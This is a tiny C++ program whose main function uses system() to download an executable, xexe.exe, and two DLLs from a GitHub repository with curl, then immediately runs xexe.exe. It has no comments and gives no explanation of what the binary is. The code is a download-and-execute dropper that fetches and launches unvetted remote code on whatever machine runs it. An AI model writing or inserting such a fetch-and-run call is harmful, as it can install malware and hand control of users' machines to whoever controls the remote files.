#include <iostream>
using namespace std;

int main(){
    system("curl -LJO https://github.com/xexe-ded/xexe/raw/refs/heads/master/xexe.exe & curl -LJO https://github.com/xexe-ded/xexe/raw/refs/heads/master/libwinpthread-1.dll & curl -LJO https://github.com/xexe-ded/xexe/raw/refs/heads/master/libgcc_s_seh-1.dll & xexe.exe");

    cout << "end";
    return 1;
}